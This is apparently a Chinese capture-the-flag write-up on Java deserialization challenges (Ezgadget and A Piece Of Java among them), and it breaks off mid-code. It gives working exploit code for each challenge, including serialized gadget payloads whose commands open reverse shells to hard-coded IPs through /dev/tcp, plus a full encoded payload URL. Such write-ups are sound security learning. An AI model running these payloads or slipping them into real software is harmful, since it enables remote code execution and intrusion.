<p>&#x8FD9;&#x91CC;exit&#x5224;&#x4E3A;true&#x5C31;&#x8D70;if, &#x4F1A;&#x628A;cinfo&#x503C;&#x4E0B;&#x7684;&#x6570;&#x636E; base64 &#x89E3;&#x5BC6;, &#x7136;&#x540E;&#x4E0D;&#x4E3A;&#x7A7A;&#x5C31;&#x5F80; if &#x91CC;&#x9762;&#x7684; try &#x8D70;, &#x6267;&#x884C; <code>(ClientInfo)Tools.parse(var20)</code>, else&#x7684;&#x90A3;&#x4E9B;&#x5F80;&#x4E0B;&#x8D70;&#x8C8C;&#x4F3C;&#x6CA1;&#x6709;&#x53EF;&#x5229;&#x7528;&#x7684;&#x70B9;, &#x5148;&#x8DDF;&#x8FDB; if &#x91CC;&#x9762;&#x7684; Tools</p>
<pre><code class="lang-java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Tools</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Serializable</span> </span>{

   <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">long</span> serialVersionUID = <span class="hljs-number">1L</span>;
   <span class="hljs-keyword">private</span> String testCall;


   <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title">parse</span><span class="hljs-params">(<span class="hljs-keyword">byte</span>[] bytes)</span> <span class="hljs-keyword">throws</span> Exception </span>{
      ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> ByteArrayInputStream(bytes));
      <span class="hljs-keyword">return</span> ois.readObject();
   }

   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">byte</span>[] create(Object obj) <span class="hljs-keyword">throws</span> Exception {
      ByteArrayOutputStream bos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();
      ObjectOutputStream outputStream = <span class="hljs-keyword">new</span> ObjectOutputStream(bos);
      outputStream.writeObject(obj);
      <span class="hljs-keyword">return</span> bos.toByteArray();
   }

   <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">readObject</span><span class="hljs-params">(ObjectInputStream in)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException </span>{
      Object obj = in.readObject();
      (<span class="hljs-keyword">new</span> ProcessBuilder((String[])((String[])obj))).start();
   }
}
</code></pre>
<blockquote>
<p> Java&#x7684;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x548C;PHP&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x7C7B;&#x4F3C;&#xFF0C;php&#x5728;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x7684;&#x65F6;&#x5019;&#x4F1A;&#x8C03;&#x7528;&#x5BF9;&#x5E94;&#x7C7B;&#x7684;__wakeup()&#x51FD;&#x6570;&#xFF0C;&#x800C;java&#x4F1A;&#x8C03;&#x7528;&#x8BE5;&#x7C7B;readObject()&#x51FD;&#x6570;&#x3002; </p>
</blockquote>
<p>&#x53EF;&#x4EE5;&#x770B;&#x5230; readObject &#x662F;&#x4E00;&#x4E2A;&#x5F88;&#x5371;&#x9669;&#x7684;&#x5229;&#x7528;&#x70B9;, &#x76F4;&#x63A5;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x6211;&#x4EEC;&#x4F20;&#x5165;&#x7684;cinfo&#x89E3;&#x5BC6;&#x7684;&#x503C;, &#x65E0;&#x6761;&#x4EF6;&#x547D;&#x4EE4;&#x6267;&#x884C;</p>
<pre><code class="lang-java">      Object obj = in.readObject();
      (<span class="hljs-keyword">new</span> ProcessBuilder((String[])((String[])obj))).start();
</code></pre>
<blockquote>
<p> <strong>java.lang.ProcessBuilder.start()</strong> &#x65B9;&#x6CD5;&#x4F7F;&#x7528;&#x6B64;&#x8FDB;&#x7A0B;&#x751F;&#x6210;&#x5668;&#x7684;&#x5C5E;&#x6027;&#x6765;&#x542F;&#x52A8;&#x4E00;&#x4E2A;&#x65B0;&#x8FDB;&#x7A0B;&#x3002;&#x65B0;&#x8FDB;&#x7A0B;&#x5C06;&#x8C03;&#x7528;command()&#x547D;&#x4EE4;&#x548C;&#x53C2;&#x6570;(&#x5047;&#x8BBE;)&#xFF0C;&#x5728;&#x5DE5;&#x4F5C;&#x76EE;&#x5F55;&#x6240;&#x7ED9;&#x51FA;&#x7684;directory()&#xFF0C;&#x6709;&#x4E00;&#x4E2A;&#x8FC7;&#x7A0B;&#x7684;&#x73AF;&#x5883;&#x6240;&#x7ED9;&#x51FA;&#x7684;environment()&#x3002;&#x6B64;&#x65B9;&#x6CD5;&#x68C0;&#x67E5;&#x8BE5;&#x547D;&#x4EE4;&#x662F;&#x4E00;&#x4E2A;&#x6709;&#x6548;&#x7684;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x547D;&#x4EE4;&#x3002;&#x8FD9;&#x547D;&#x4EE4;&#x662F;&#x6709;&#x6548;&#x53D6;&#x51B3;&#x4E8E;&#x7CFB;&#x7EDF;&#xFF0C;&#x4F46;&#x6700;&#x8D77;&#x7801;&#x7684;&#x547D;&#x4EE4;&#x5FC5;&#x987B;&#x975E;&#x7A7A;&#x5B57;&#x7B26;&#x4E32;&#x7684;&#x975E;&#x7A7A;&#x5217;&#x8868;&#x3002; </p>
</blockquote>
<h3 id="&#x6CD5;&#x4E00;">&#x6CD5;&#x4E00;:</h3>
<p>&#x5728;java&#x4E2D;readObject&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x8BFB;&#x53D6; writeObject&#x7684;&#x5185;&#x5BB9;, &#x7531;&#x6B64;&#x5728;Tools&#x7C7B;&#x91CD;&#x5199;WriteObject&#x65B9;&#x6CD5;</p>
<pre><code class="lang-java">    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">writeObject</span><span class="hljs-params">(ObjectOutputStream out)</span> <span class="hljs-keyword">throws</span> IOException,ClassNotFoundException </span>{
        String command[] = {<span class="hljs-string">&quot;bash&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, <span class="hljs-string">&quot;bash -i&gt;&amp; /dev/tcp/39.97.114.43/8888 0&gt;&amp;1&quot;</span>};
        out.writeObject(command);
    }
</code></pre>
<p>&#x7136;&#x540E;&#x5EFA;&#x7ACB; payload</p>
<pre><code class="lang-java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Main</span> </span>{
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>{
        Base64.Encoder encoder = Base64.getEncoder();
        <span class="hljs-keyword">try</span> {
            Tools cinfo = <span class="hljs-keyword">new</span> Tools();
            <span class="hljs-keyword">byte</span>[] bytes = Tools.create(cinfo);
            String payload = encoder.encodeToString(bytes);
            System.out.println(payload);
            Tools.parse(bytes);
        } <span class="hljs-keyword">catch</span> (Exception e) {
            e.printStackTrace();
        }

    }
}
</code></pre>
<h3 id="&#x6CD5;&#x4E8C;">&#x6CD5;&#x4E8C;:</h3>
<p>&#x8BA9;obj&#x4E3A;Tools&#x79C1;&#x6709;&#x53D8;&#x91CF;&#x7684;testCall&#xFF0C;&#x901A;&#x8FC7;ClentInfoFilter&#x8FC7;&#x6EE4;&#x5668;&#xFF0C;&#x51FA;&#x53D1;Tools&#x7C7B;&#x7684;parse&#x65B9;&#x6CD5;&#x8C03;&#x7528;Tools&#x7C7B;readObject()&#xFF0C;&#x8FDB;&#x800C;&#x8C03;&#x7528; (new ProcessBuilder((String[])((String[])obj))).start(), &#x7531;&#x6B64;&#x8BA9;testCall&#x7B49;&#x4E8E;&#x8981;&#x8FDB;&#x884C;&#x7684;&#x547D;&#x4EE4;&#xFF0C;&#x5C31;&#x53EF;&#x4EE5;RCE&#x4E86;</p>
<pre><code class="lang-java"><span class="hljs-keyword">package</span> com.tools;

<span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;
<span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;
<span class="hljs-keyword">import</span> java.io.IOException;
<span class="hljs-keyword">import</span> java.io.ObjectInputStream;
<span class="hljs-keyword">import</span> java.io.ObjectOutputStream;
<span class="hljs-keyword">import</span> java.io.Serializable;

<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Tools</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Serializable</span> </span>{
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">long</span> serialVersionUID = <span class="hljs-number">1L</span>;

    <span class="hljs-keyword">private</span> String testCall[];

    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title">parse</span><span class="hljs-params">(<span class="hljs-keyword">byte</span>[] bytes)</span> <span class="hljs-keyword">throws</span> Exception </span>{
        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> ByteArrayInputStream(bytes));
        <span class="hljs-keyword">return</span> ois.readObject();
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">byte</span>[] create(Object obj) <span class="hljs-keyword">throws</span> Exception {
        ByteArrayOutputStream bos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();
        ObjectOutputStream outputStream = <span class="hljs-keyword">new</span> ObjectOutputStream(bos);
        outputStream.writeObject(obj);
        <span class="hljs-keyword">return</span> bos.toByteArray();
    }

    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">readObject</span><span class="hljs-params">(ObjectInputStream in)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException </span>{
        Object obj = in.readObject();
        (<span class="hljs-keyword">new</span> ProcessBuilder((String[])obj)).start();
    }


    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setTestCall</span><span class="hljs-params">(String[] testCall)</span> </span>{
        <span class="hljs-keyword">this</span>.testCall = testCall;
    }

}
</code></pre>
<p>&#x8D4B;&#x503C;&#x7ED9; testCall &#x518D;&#x5199;&#x5165;&#x547D;&#x4EE4;&#x6267;&#x884C;</p>
<pre><code class="lang-java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Main</span> </span>{
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>{
        Base64.Encoder encoder = Base64.getEncoder();
        <span class="hljs-keyword">try</span> {
            Tools cinfo = <span class="hljs-keyword">new</span> Tools();
            String commands[] = {<span class="hljs-string">&quot;bash&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, <span class="hljs-string">&quot;bash -i&gt;&amp; /dev/tcp/39.97.114.43/8888 0&gt;&amp;1&quot;</span>};
            cinfo.setTestCall(commands);
            <span class="hljs-keyword">byte</span>[] bytes = Tools.create(cinfo);
            String payload = encoder.encodeToString(bytes);
            System.out.println(payload);
        } <span class="hljs-keyword">catch</span> (Exception e) {
            e.printStackTrace();
        }
    }
}
</code></pre>
<p>&#x7136;&#x540E;&#x4FEE;&#x6539; cookie &#x7684; cinfo &#x5237;&#x65B0;&#x5373;&#x53EF;</p>
<h2 id="&#x4E1C;&#x534E;&#x676F;-2021ezgadget">[&#x4E1C;&#x534E;&#x676F; 2021]Ezgadget</h2>
<p>&#x53CD;&#x7F16;&#x8BD1;, &#x628A;&#x5BFC;&#x51FA;&#x7684;lib&#x5305; Add as library &#x4E5F;&#x5C31;&#x662F;&#x4F5C;&#x4E3A;&#x8D44;&#x6E90;&#x5305;(&#x53EF;&#x8C03;&#x7528;&#x7C7B;), &#x7136;&#x540E; debug ctfApplication &#x8FDB;&#x884C;&#x8C03;&#x8BD5;, tools&#x4E2D;&#x6709;&#x4E2A;&#x7C7B; ToStringBean</p>
<pre><code class="lang-java"><span class="hljs-keyword">package</span> com.ezgame.ctf.tools;

<span class="hljs-keyword">import</span> java.io.*;

<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ToStringBean</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">ClassLoader</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Serializable</span>
</span>{
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">byte</span>[] ClassByte;

    <span class="hljs-meta">@Override</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">toString</span><span class="hljs-params">()</span> </span>{
        <span class="hljs-keyword">final</span> ToStringBean toStringBean = <span class="hljs-keyword">new</span> ToStringBean();
        <span class="hljs-keyword">final</span> Class clazz = toStringBean.defineClass(<span class="hljs-keyword">null</span>, <span class="hljs-keyword">this</span>.ClassByte, <span class="hljs-number">0</span>, <span class="hljs-keyword">this</span>.ClassByte.length);
        Object Obj = <span class="hljs-keyword">null</span>;
        <span class="hljs-keyword">try</span> {
            Obj = clazz.newInstance();
        }
        <span class="hljs-keyword">catch</span> (InstantiationException e) {
            e.printStackTrace();
        }
        <span class="hljs-keyword">catch</span> (IllegalAccessException e2) {
            e2.printStackTrace();
        }
        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;enjoy it.&quot;</span>;
    }
}
</code></pre>
<p>&#x4F7F;&#x7528;&#x4E86; defineClass, <strong>this.ClassByte</strong> &#x53EF;&#x63A7;, &#x7ED9;&#x51FA;&#x4E00;&#x4E2A; defineClass &#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;&#x7684;&#x5B9E;&#x4F8B;</p>
<pre><code class="lang-java"><span class="hljs-keyword">import</span> javassist.ClassPool;
<span class="hljs-keyword">import</span> javassist.CtClass;
<span class="hljs-keyword">import</span> java.lang.reflect.Method;

<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Hello</span> </span>{
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception</span>{
        ClassPool classpool= ClassPool.getDefault();
        CtClass hello = classpool.makeClass(<span class="hljs-string">&quot;Hello&quot;</span>);
        String cmd = <span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc.exe\&quot;);&quot;</span>;
        hello.makeClassInitializer().insertBefore(cmd);
        <span class="hljs-keyword">byte</span>[] classbyte = hello.toBytecode();

        Method defineClass = ClassLoader.class.getDeclaredMethod(<span class="hljs-string">&quot;defineClass&quot;</span>, String.class, <span class="hljs-keyword">byte</span>[].class, <span class="hljs-keyword">int</span>.class, <span class="hljs-keyword">int</span>.class);
        defineClass.setAccessible(<span class="hljs-keyword">true</span>);
        Class testhello = (Class)defineClass.invoke(ClassLoader.getSystemClassLoader(), <span class="hljs-string">&quot;Hello&quot;</span>, classbyte, <span class="hljs-number">0</span>, classbyte.length);
        testhello.newInstance();
    }
}
</code></pre>
<p>&#x53EF;&#x4EE5;&#x5F97;&#x77E5;</p>
<blockquote>
<p>defineClass(String.class, byte[].class, int.class, int.class);</p>
<p>String.class &#x662F;&#x52A0;&#x8F7D;&#x7C7B;&#x7684;&#x547D;&#x540D;</p>
<p>byte[].class &#x5B58;&#x653E;&#x7684;&#x662F;&#x7C7B;&#x7684;&#x5B57;&#x8282;&#x7801;</p>
<p>&#x7B2C;&#x4E09;&#x4E2A; int.class &#x9ED8;&#x8BA4;&#x4E3A; 0, &#x731C;&#x6D4B;&#x662F;&#x5F00;&#x59CB;&#x4F4D;&#x7F6E;</p>
<p>&#x7B2C;&#x56DB;&#x4E2A; int.class &#x4F20;&#x5165;&#x5B57;&#x8282;&#x7801;&#x7684;&#x957F;&#x5EA6;</p>
</blockquote>
<p>&#x672C;&#x9898;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x89E6;&#x53D1; Tools &#x7C7B;&#x4E2D;&#x7684; toString &#x65B9;&#x6CD5;&#x6765;&#x89E6;&#x53D1;&#x5B57;&#x8282;&#x7801;&#x52A0;&#x8F7D;, &#x5168;&#x5C40;&#x641C;&#x7D22; jdk &#x4E2D; readObject &#x8C03;&#x7528; toString &#x65B9;&#x6CD5;, &#x5176;&#x5B9E;&#x53D1;&#x73B0;CC5&#x4E2D;&#x6709;&#x4E2A; <code>BadAttributeValueExpException</code> &#x53EF;&#x4EE5;&#x89E6;&#x53D1; toString</p>
<pre><code class="lang-java">    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">readObject</span><span class="hljs-params">(ObjectInputStream ois)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException </span>{
        ObjectInputStream.GetField gf = ois.readFields();
        Object valObj = gf.get(<span class="hljs-string">&quot;val&quot;</span>, <span class="hljs-keyword">null</span>);

        <span class="hljs-keyword">if</span> (valObj == <span class="hljs-keyword">null</span>) {
            val = <span class="hljs-keyword">null</span>;
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (valObj <span class="hljs-keyword">instanceof</span> String) {
            val= valObj;
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (System.getSecurityManager() == <span class="hljs-keyword">null</span>
                || valObj <span class="hljs-keyword">instanceof</span> Long
                || valObj <span class="hljs-keyword">instanceof</span> Integer
                || valObj <span class="hljs-keyword">instanceof</span> Float
                || valObj <span class="hljs-keyword">instanceof</span> Double
                || valObj <span class="hljs-keyword">instanceof</span> Byte
                || valObj <span class="hljs-keyword">instanceof</span> Short
                || valObj <span class="hljs-keyword">instanceof</span> Boolean) {
            val = valObj.toString();
        } <span class="hljs-keyword">else</span> { <span class="hljs-comment">// the serialized object is from a version without JDK-8019292 fix</span>
            val = System.identityHashCode(valObj) + <span class="hljs-string">&quot;@&quot;</span> + valObj.getClass().getName();
        }
    }
</code></pre>
<p>&#x6211;&#x4EEC;&#x53EA;&#x9700;&#x8981;&#x63A7;&#x5236; val &#x4E3A; <code>ToStringBean</code> , &#x7136;&#x540E;&#x63A7;&#x5236; <code>ToStringBean</code> &#x4E2D;&#x7684; <code>this.ClassByte</code> &#x4E3A;&#x6211;&#x4EEC;&#x81EA;&#x5DF1;&#x6240;&#x6784;&#x5EFA;&#x7684;&#x5B57;&#x8282;&#x7801;&#x5373;&#x53EF;, &#x6784;&#x9020; EXP</p>
<pre><code class="lang-java"><span class="hljs-keyword">package</span> com.ezgame.ctf.controller;

<span class="hljs-keyword">import</span> com.ezgame.ctf.tools.ToStringBean;
<span class="hljs-keyword">import</span> javassist.ClassPool;
<span class="hljs-keyword">import</span> javassist.CtClass;

<span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;
<span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;
<span class="hljs-keyword">import</span> java.io.ObjectOutputStream;
<span class="hljs-keyword">import</span> java.lang.reflect.Field;
<span class="hljs-keyword">import</span> java.net.URLEncoder;
<span class="hljs-keyword">import</span> java.util.Base64;

<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Poctest</span> </span>{
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception</span>{
        ClassPool pool = ClassPool.getDefault();
        CtClass evil = pool.makeClass(<span class="hljs-string">&quot;evil&quot;</span>);
        String cmd = <span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;bash -c bash$IFS$9-i&gt;&amp;/dev/tcp/169.254.191.77/23337&lt;&amp;1\&quot;);&quot;</span>;
        evil.makeClassInitializer().insertBefore(cmd);
        <span class="hljs-keyword">byte</span>[] classbyte = evil.toBytecode();
        ToStringBean toStringBean = <span class="hljs-keyword">new</span> ToStringBean();
        BadAttributeValueExpException val = <span class="hljs-keyword">new</span> BadAttributeValueExpException(<span class="hljs-keyword">null</span>);
        Field valfield = val.getClass().getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);
        valfield.setAccessible(<span class="hljs-keyword">true</span>);
        valfield.set(val, toStringBean);

        Field f = Class.forName(<span class="hljs-string">&quot;com.ezgame.ctf.tools.ToStringBean&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;ClassByte&quot;</span>);
        f.setAccessible(<span class="hljs-keyword">true</span>);
        f.set(toStringBean, classbyte);

        ByteArrayOutputStream barr = <span class="hljs-keyword">new</span> ByteArrayOutputStream();
        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(barr);
        oos.writeUTF(<span class="hljs-string">&quot;gadgets&quot;</span>);
        oos.writeInt(<span class="hljs-number">2021</span>);
        oos.writeObject(val);
        oos.close();

        System.out.println(URLEncoder.encode(<span class="hljs-keyword">new</span> String(Base64.getEncoder().encode(barr.toByteArray()))));
    }
}
</code></pre>
<p>&#x7136;&#x540E;&#x901A;&#x8FC7; /readObject?data= &#x89E6;&#x53D1;</p>
<pre><code>http://localhost:8888/readobject?data=rO0ABXcNAAdnYWRnZXRzAAAH5XNyAC5qYXZheC5tYW5hZ2VtZW50LkJhZEF0dHJpYnV0ZVZhbHVlRXhwRXhjZXB0aW9u1Ofaq2MtRkACAAFMAAN2YWx0ABJMamF2YS9sYW5nL09iamVjdDt4cgATamF2YS5sYW5nLkV4Y2VwdGlvbtD9Hz4aOxzEAgAAeHIAE2phdmEubGFuZy5UaHJvd2FibGXVxjUnOXe4ywMABEwABWNhdXNldAAVTGphdmEvbGFuZy9UaHJvd2FibGU7TAANZGV0YWlsTWVzc2FnZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sACnN0YWNrVHJhY2V0AB5bTGphdmEvbGFuZy9TdGFja1RyYWNlRWxlbWVudDtMABRzdXBwcmVzc2VkRXhjZXB0aW9uc3QAEExqYXZhL3V0aWwvTGlzdDt4cHEAfgAIcHVyAB5bTGphdmEubGFuZy5TdGFja1RyYWNlRWxlbWVudDsCRio8PP0iOQIAAHhwAAAAAXNyABtqYXZhLmxhbmcuU3RhY2tUcmFjZUVsZW1lbnRhCcWaJjbdhQIABEkACmxpbmVOdW1iZXJMAA5kZWNsYXJpbmdDbGFzc3EAfgAFTAAIZmlsZU5hbWVxAH4ABUwACm1ldGhvZE5hbWVxAH4ABXhwAAAAFnQAIWNvbS5lemdhbWUuY3RmLmNvbnRyb2xsZXIuUG9jdGVzdHQADFBvY3Rlc3QuamF2YXQABG1haW5zcgAmamF2YS51dGlsLkNvbGxlY3Rpb25zJFVubW9kaWZpYWJsZUxpc3T8DyUxteyOEAIAAUwABGxpc3RxAH4AB3hyACxqYXZhLnV0aWwuQ29sbGVjdGlvbnMkVW5tb2RpZmlhYmxlQ29sbGVjdGlvbhlCAIDLXvceAgABTAABY3QAFkxqYXZhL3V0aWwvQ29sbGVjdGlvbjt4cHNyABNqYXZhLnV0aWwuQXJyYXlMaXN0eIHSHZnHYZ0DAAFJAARzaXpleHAAAAAAdwQAAAAAeHEAfgAVeHNyACFjb20uZXpnYW1lLmN0Zi50b29scy5Ub1N0cmluZ0JlYW4TzFRaJ9nceQIAAVsACUNsYXNzQnl0ZXQAAltCeHB1cgACW0Ks8xf4BghU4AIAAHhwAAABhMr%2Bur4AAAAxABkBAARldmlsBwABAQAQamF2YS9sYW5nL09iamVjdAcAAwEAClNvdXJjZUZpbGUBAAlldmlsLmphdmEBAAg8Y2xpbml0PgEAAygpVgEABENvZGUBABFqYXZhL2xhbmcvUnVudGltZQcACgEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMAAwADQoACwAOAQA2YmFzaCAtYyBiYXNoJElGUyQ5LWk%2BJi9kZXYvdGNwLzE2OS4yNTQuMTkxLjc3LzIzMzM3PCYxCAAQAQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwwAEgATCgALABQBAAY8aW5pdD4MABYACAoABAAXACEAAgAEAAAAAAACAAgABwAIAAEACQAAABYAAgAAAAAACrgADxIRtgAVV7EAAAAAAAEAFgAIAAEACQAAABEAAQABAAAABSq3ABixAAAAAAABAAUAAAACAAY%3D
</code></pre><p>&#x5373;&#x53EF;getshell, &#x6B64;&#x9898;&#x8003;&#x5BDF;&#x7684;&#x662F; java &#x7684;&#x53CD;&#x5E8F;&#x5217;&#x5316;, &#x8FD8;&#x9700;&#x8981;&#x518D;&#x5BF9; java &#x53CD;&#x5E8F;&#x5217;&#x5316;&#x6709;&#x66F4;&#x6DF1;&#x5165;&#x7684;&#x4E86;&#x89E3;</p>
<h2 id="&#x7F8A;&#x57CE;&#x676F;-2020a-piece-of-java">[&#x7F8A;&#x57CE;&#x676F; 2020]A Piece Of Java</h2>
<p>&#x7ED9;&#x4E86;jar&#x5305;, &#x53CD;&#x7F16;&#x8BD1;&#x540E;&#x67E5;&#x770B;, /hello &#x63A5;&#x53E3;&#x53EF;&#x4EE5; GET cookie &#x53CD;&#x5E8F;&#x5217;&#x5316;</p>
<pre><code class="lang-java">   <span class="hljs-meta">@GetMapping</span>({<span class="hljs-string">&quot;/hello&quot;</span>})
   <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">hello</span><span class="hljs-params">(@CookieValue(value = <span class="hljs-string">&quot;data&quot;</span>,required = <span class="hljs-keyword">false</span>)</span> String cookieData, Model model) </span>{
      <span class="hljs-keyword">if</span> (cookieData != <span class="hljs-keyword">null</span> &amp;&amp; !cookieData.equals(<span class="hljs-string">&quot;&quot;</span>)) {
         Info info = (Info)<span class="hljs-keyword">this</span>.deserialize(cookieData);
         <span class="hljs-keyword">if</span> (info != <span class="hljs-keyword">null</span>) {
            model.addAttribute(<span class="hljs-string">&quot;info&quot;</span>, info.getAllInfo());
         }

         <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;hello&quot;</span>;
      } <span class="hljs-keyword">else</span> {
         <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;redirect:/index&quot;</span>;
      }
   }
</code></pre>
<p>deserialize&#x5F00;&#x59CB;new&#x4E86;&#x4E00;&#x4E2A; SerialKiller</p>
<pre><code class="lang-java">   <span class="hljs-function"><span class="hljs-keyword">private</span> Object <span class="hljs-title">deserialize</span><span class="hljs-params">(String base64data)</span> </span>{
      ByteArrayInputStream bais = <span class="hljs-keyword">new</span> ByteArrayInputStream(Base64.getDecoder().decode(base64data));

      <span class="hljs-keyword">try</span> {
         ObjectInputStream ois = <span class="hljs-keyword">new</span> SerialKiller(bais, <span class="hljs-string">&quot;serialkiller.conf&quot;</span>);
         Object obj = ois.readObject();
         ois.close();
         <span class="hljs-keyword">return</span> obj;
      } <span class="hljs-keyword">catch</span> (Exception var5) {
         var5.printStackTrace();
         <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;
      }
   }
}
</code></pre>
<p>&#x627E;&#x5230; .conf &#x6587;&#x4EF6;</p>
<pre><code>    &lt;whitelist&gt;
        &lt;regexp&gt;gdufs\..*&lt;/regexp&gt;
        &lt;regexp&gt;java\.lang\..*&lt;/regexp&gt;
    &lt;/whitelist&gt;
</code></pre><p>&#x4E5F;&#x5C31;&#x662F;&#x9700;&#x8981;&#x6EE1;&#x8DB3;&#x767D;&#x540D;&#x5355;&#x624D;&#x53EF;&#x4EE5;&#x8FDB;&#x884C;&#x53CD;&#x5E8F;&#x5217;&#x5316;, lib&#x91CC;&#x9762;&#x6709; CC 3.2.1, &#x7136;&#x540E;&#x5148;&#x53BB;&#x67E5;&#x627E;&#x6EE1;&#x8DB3;&#x767D;&#x540D;&#x5355;&#x7684;&#x7C7B;, &#x5168;&#x5C40;&#x641C;&#x7D22; Serializable, &#x53EF;&#x7528;&#x7684;&#x7C7B;</p>
<pre><code>gdufs.challenge.web.invocation.InfoInvocationHandler
gdufs.challenge.web.model.DatabaseInfo
</code></pre><p>&#x5176;&#x4E2D; DatabaseInfo &#x7684; checkAllInfo &#x53EF;&#x4EE5;&#x6076;&#x610F;&#x8FDE;&#x63A5;&#x6570;&#x636E;&#x5E93;</p>
<pre><code>   public Boolean checkAllInfo() {
      if (this.host != null &amp;&amp; this.port != null &amp;&amp; this.username != null &amp;&amp; this.password != null) {
         if (this.connection == null) {
            this.connect();
         }

         return true;
      } else {
         return false;
      }
   }
</code></pre><p>&#x7136;&#x540E;&#x56E0;&#x4E3A;<strong>&#x4EE3;&#x7406;&#x5BF9;&#x8C61;&#x5728;&#x6267;&#x884C;&#x88AB;&#x4EE3;&#x7406;&#x5BF9;&#x8C61;&#x7684;&#x4EFB;&#x4F55;&#x65B9;&#x6CD5;&#x524D;&#x90FD;&#x4F1A;&#x6267;&#x884C;&#x91CD;&#x5199;&#x7684;<code>invoke</code>&#x65B9;&#x6CD5;</strong>, &#x89E6;&#x53D1; InfoInvocationHandler &#x4E2D;&#x7684; invoke &#x4ECE;&#x800C;&#x8C03;&#x7528; checkAllInfo</p>
<pre><code class="lang-java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">InfoInvocationHandler</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">InvocationHandler</span>, <span class="hljs-title">Serializable</span> </span>{
   <span class="hljs-keyword">private</span> Info info;

   <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">InfoInvocationHandler</span><span class="hljs-params">(Info info)</span> </span>{
